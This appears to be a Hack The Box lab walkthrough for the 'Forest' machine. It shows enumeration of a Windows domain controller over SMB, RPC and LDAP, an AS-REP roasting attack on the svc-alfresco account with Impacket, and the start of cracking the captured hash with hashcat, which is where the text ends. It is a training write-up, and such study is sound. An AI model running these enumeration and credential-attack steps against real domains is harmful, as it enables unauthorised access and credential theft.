# Forest

## Table Of Contents:
<!--ts-->
  * [Enumeration](#enumeration)
    * [NMAP Scan](#nmap-scan)
    * [SMB](#smb)
    * [LDAP](#ldap)
      * [ldapsearch](#ldapsearch)
      * [Enum4Linux](#enum4linux)
      * [windapsearch](#windapsearch)
    * [RPC](#rpc)
      * [rpcclient](#rpcclient)
 * [Initial Access](#initial-access)
   * [WinRM](#winrm)
 * [Active Directory](#active-directory)
   * [Enumeration](#enumeration)
     * [BloodHound](#bloodhound)
       * [Remote](#remote)
   * [Kerberos](#kerberos)
     * [ASREPROAST](#asreproast)
* [Password Cracking](#password-cracking)
  * [TGT And TGS](#tgt-and-tgs)
    * [Hashcat](#hashcat)
    * [John The Ripper](#john-the-ripper)
<!--te-->

# **Enumeration**

## **NMAP Scan**
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ nmap -sC -sV -p- 10.129.200.84                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 07:30 EST
Nmap scan report for 10.129.200.84
Host is up (0.046s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-01 12:38:16Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
63533/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-01T04:39:06-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-01-01T12:39:09
|_  start_date: 2024-12-31T13:52:32
|_clock-skew: mean: 2h46m51s, deviation: 4h37m08s, median: 6m51s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.22 seconds

```

From the available ports this machine is looking like a Domain Controller.

## **SMB**

### Attempting Anonymous Login

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ smbmap -H 10.129.200.84               

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ smbclient --no-pass -L //10.129.200.84
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.200.84 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ crackmapexec smb 10.129.200.84 --shares
SMB         10.129.200.84   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

The anonymous login appears to work; however, not seeing any shares...

### Continued Enumeration on SMB

Checking RPC Anonymous Logon
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ rpcclient -U "" -N 10.129.200.84                       
rpcclient $> 
```

This works so let us now test if we can get more info!

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ rpcclient -U "" -N 10.129.200.84                       
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

With this we can build a user list!

Using Nmap SMB Scripts
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ nmap --script "safe or smb-enum-*" -p 445 10.129.200.84
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 07:48 EST
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for 10.129.200.84
Host is up (0.047s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| dns-blacklist: 
|   SPAM
|_    l2.apews.org - FAIL
|_fcrdns: FAIL (No PTR record)
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.129.200.84\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.129.200.84\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.129.200.84\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\10.129.200.84\NETLOGON: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>
| smb-enum-users: 
|   HTB\$331000-VK4ADACQNUCA (RID: 1123)
|     Flags:       Password not required, Normal user account, Account disabled, Password Expired
|   HTB\Administrator (RID: 500)
|     Full name:   Administrator
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account
|   HTB\andy (RID: 1150)
|     Full name:   Andy Hislip
|     Flags:       Password does not expire, Normal user account
|   HTB\baggins (RID: 10101)
|     Flags:       Normal user account
|   HTB\DefaultAccount (RID: 503)
|     Description: A user account managed by the system.
|     Flags:       Password not required, Password does not expire, Normal user account, Account disabled
|   HTB\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Password does not expire, Normal user account, Account disabled
|   HTB\HealthMailbox0659cc1 (RID: 1144)
|     Full name:   HealthMailbox-EXCH01-010
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox670628e (RID: 1137)
|     Full name:   HealthMailbox-EXCH01-003
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox6ded678 (RID: 1139)
|     Full name:   HealthMailbox-EXCH01-005
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox7108a4e (RID: 1143)
|     Full name:   HealthMailbox-EXCH01-009
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox83d6781 (RID: 1140)
|     Full name:   HealthMailbox-EXCH01-006
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox968e74d (RID: 1138)
|     Full name:   HealthMailbox-EXCH01-004
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxb01ac64 (RID: 1142)
|     Full name:   HealthMailbox-EXCH01-008
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc0a90c9 (RID: 1136)
|     Full name:   HealthMailbox-EXCH01-002
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc3d7722 (RID: 1134)
|     Full name:   HealthMailbox-EXCH01-Mailbox-Database-1118319013
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfc9daad (RID: 1135)
|     Full name:   HealthMailbox-EXCH01-001
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfd87238 (RID: 1141)
|     Full name:   HealthMailbox-EXCH01-007
|     Flags:       Password does not expire, Normal user account
|   HTB\krbtgt (RID: 502)
|     Description: Key Distribution Center Service Account
|     Flags:       Normal user account, Account disabled
|   HTB\lucinda (RID: 1146)
|     Full name:   Lucinda Berger
|     Flags:       Password does not expire, Normal user account
|   HTB\mark (RID: 1151)
|     Full name:   Mark Brandt
|_    Flags:       Password does not expire, Normal user account
| smb2-time: 
|   date: 2025-01-01T12:56:29
|_  start_date: 2024-12-31T13:52:32
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-01T04:56:35-08:00
|_clock-skew: mean: 2h46m54s, deviation: 4h37m11s, median: 6m51s
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_msrpc-enum: NT_STATUS_ACCESS_DENIED
| port-states: 
|   tcp: 
|_    open: 445
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Leasing
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-enum-domains: 
|   Builtin
|     Groups: Account Operators, Pre-Windows 2000 Compatible Access, Incoming Forest Trust Builders, Windows Authorization Access Group, Terminal Server License Servers, Administrators, Users, Guests, Print Operators, Backup Operators, Replicator, Remote Desktop Users, Network Configuration Operators, Performance Monitor Users, Performance Log Users, Distributed COM Users, IIS_IUSRS, Cryptographic Operators, Event Log Readers, Certificate Service DCOM Access, RDS Remote Access Servers, RDS Endpoint Servers, RDS Management Servers, Hyper-V Administrators, Access Control Assistance Operators, Remote Management Users, System Managed Accounts Group, Storage Replica Administrators, Server Operators
|     Users: n/a
|     Creation time: 2016-07-16T13:19:09
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|     Account lockout disabled
|   HTB
|     Groups: Cert Publishers, RAS and IAS Servers, Allowed RODC Password Replication Group, Denied RODC Password Replication Group, DnsAdmins
|     Users: Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad
|     Creation time: 2024-12-31T13:52:22
|     Passwords: min length: 7; min age: 1.0 days; max age: n/a days; history: 24 passwords
|_    Account lockout disabled
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.129.200.84
Nmap done: 1 IP address (1 host up) scanned in 269.70 seconds

```

## **LDAP**

### Nmap Scripts For Public Information

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ nmap -n -sV --script "ldap* and not brute" 10.129.200.84                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-01 08:14 EST
Nmap scan report for 10.129.200.84
Host is up (0.061s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-01 13:21:36Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20250101132138.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=htb,DC=local
|       dsServiceName: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=htb,DC=local
|       namingContexts: CN=Configuration,DC=htb,DC=local
|       namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
|       namingContexts: DC=DomainDnsZones,DC=htb,DC=local
|       namingContexts: DC=ForestDnsZones,DC=htb,DC=local
|       defaultNamingContext: DC=htb,DC=local
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=htb,DC=local
|       configurationNamingContext: CN=Configuration,DC=htb,DC=local

SNIP
```
NOTE: This is a lot of information to sift so we will try to narrow down, like finding users



### Checking Anonymous Bind

#### LDAPSEARCH

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ ldapsearch -x -H ldap://10.129.200.84 -D '' -w '' -b "DC=htb,DC=local"
```

NOTE: Ensure you add a record in */etc/hosts* correlating the target IP to the domain *htb.local* before doing the below command

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/openvpn]
└─$ ldapsearch -H ldap://htb.local:389/ -x -s base -b 'dc=htb,dc=local' 
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: dc=htb,dc=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20241231212149.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 2682334
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: AgAAAAAAAAASAAAAAAAAAIArugegK3xCjpG3jOKvTZsK8AAAAAAAAPxOm
 RMDAAAAEeYhGk0xaEyawzvMi5bZbx0ADQAAAAAA1L0+FwMAAABptVkf+oupR7OwUi6g1GLsFlADAA
 AAAAAB1aoTAwAAADqjayNZeUFKuVlfgmiaCHEFoAAAAAAAAF8hmRMDAAAA550WLBTQ2UuhowLQP8A
 4SyAwDgAAAAAAEoiEHQMAAAD9IT857pY2TLBDvA9wjXW6GRAEAAAAAABuyT0XAwAAABA8AUG0jJ1F
 iOJ6vAWO49cVMAMAAAAAANXXphMDAAAAtTDGYaJBsEWxNEEatU4xYwjQAAAAAAAAnz2ZEwMAAABOf
 GN4ZhbsSauczVHuYEiBE3ACAAAAAADdbaATAwAAADH0xotFcHlDppuZ8rSNJnAMEAEAAAAAAIbFmR
 MDAAAAtwL+jwq2+0WZliEirTGKpwawAAAAAAAA1ymZEwMAAAAaxJ+QNDLHQ55lTGqoLvfGCwABAAA
 AAADKrZkTAwAAAFBd76JcNvNMvcbhLzeCkdkXoAMAAAAAAGmqqxMDAAAAGcL6qk8Zs0qRG/BZYykq
 ex+QDQAAAAAADsc+FwMAAAB5TzHrWI2FTZJLavLc7Dl3CeAAAAAAAADPRZkTAwAAAMnKXu73q7hBp
 RxZtKkWpCEecA0AAAAAAJnFPhcDAAAAEuOp8cC6t0+uaoe83jqnLQfAAAAAAAAAwzeZEwMAAACevY
 D5RBP7RbrYAQrgjhuPHNAMAAAAAACxrz4XAwAAAA==
creationTime: 133801267423567764
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAALB4ltxV1shXFsPNP
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=htb,DC=local
fSMORoleOwner: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Nam
 e,CN=Sites,CN=Configuration,DC=htb,DC=local
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=htb,
 DC=local
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=htb,DC=local
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=htb
 ,DC=local
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=htb,DC=local
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 htb,DC=local
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=h
 tb,DC=local
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=htb
 ,DC=local
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=htb,DC=lo
 cal
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=htb,DC=local
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=htb,DC
 =local
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=htb,DC=loc
 al
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=htb,DC=local;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=htb,DC
 =local
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=htb,DC=local
masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,C
 N=Sites,CN=Configuration,DC=htb,DC=local
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=htb,DC=local
msDS-IsDomainFor: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-
 Name,CN=Sites,CN=Configuration,DC=htb,DC=local
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
## **Getting User List**

### windapsearch.py

```bash
─[us-dedivip-1]─[10.10.14.63]─[kali@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ python windapsearch.py --dc-ip 10.129.200.84 -u '' -p '' -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.200.84
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 29 users: 

cn: Guest

cn: DefaultAccount

cn: Exchange Online-ApplicationAccount
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local

cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local

cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local

cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local

cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local

cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local

cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local

cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local

cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local

cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local

cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local

cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local

cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local

cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local

cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local

cn: HealthMailbox6ded67848a234577a1756e072081d01f
userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local

cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local

cn: HealthMailboxfd87238e536e49e08738480d300e3772
userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local

cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local

cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local

cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local

cn: Sebastien Caron
userPrincipalName: sebastien@htb.local

cn: Lucinda Berger
userPrincipalName: lucinda@htb.local

cn: Andy Hislip
userPrincipalName: andy@htb.local

cn: Mark Brandt
userPrincipalName: mark@htb.local

cn: Santi Rodriguez
userPrincipalName: santi@htb.local

[*] Bye!
```

# **Initial Access**

During the enumeration of users we discovered a service account, *svc-alfresco*.
Researching that service we see that the service requires the service account to have *pre-authentication required* disabled, making this account susceptible to ASREPROAST attacks!

## Acquire TGT for *svc-alfresco*

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ python GetNPUsers.py htb.local/svc-alfresco -format hashcat -outputfile hashes.asreproast
Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Cannot authenticate svc-alfresco, getting its TGT
$krb5asrep$23$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470
```
Now that we have a TGT for the *svc-alfresco* account, we can attempt to crack the hash!

## Cracking TGT Hash

First lets save the hash to a file:
```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ echo "\$krb5asrep\$23\$svc-alfresco@HTB.LOCAL:bd6dc292cf1b334b264e7395fae24749\$feb8f3f05489dae2b4f2bdee81889f19191c211bf7304948671bfec6bd08c7f59b30e1b0b45d2692994b192a30bce0d6011bcdd809b0388cb104abae25b34c1714e8556aef891f4771d49b58fb2c9e57fb2d5c445eccb47133ba1810e9c4480cf0f2001e7c76de5e0d43a3c5bdbd086a226a69af2d0db92bc6c261d61771ebefb6e30e2445734b5512dbfc75b4166a6474220e5cfffbca7ed4e3d5393ccbcb705367492c19d4d27b4a8886918cf325a21e051fc48dbbbf9af3b0bf796e155d48a8759b77823d5ecd12f976aa12c29458b96fe329441586232397561b5cfaa7779a1438204470
" > alfresco.hash
```

**NOTE:** Before trying to crack the hash, we could use the password policy in the domain to narrow our password list entries to increase efficiency, but for this machine we do not need to.

### Hashcat

```bash
┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-pukfvgtk0k]─[~/Desktop]
└──╼ [★]$ hashcat -m 18200 -a 0 alfresco.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3919/7902 MB (987 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

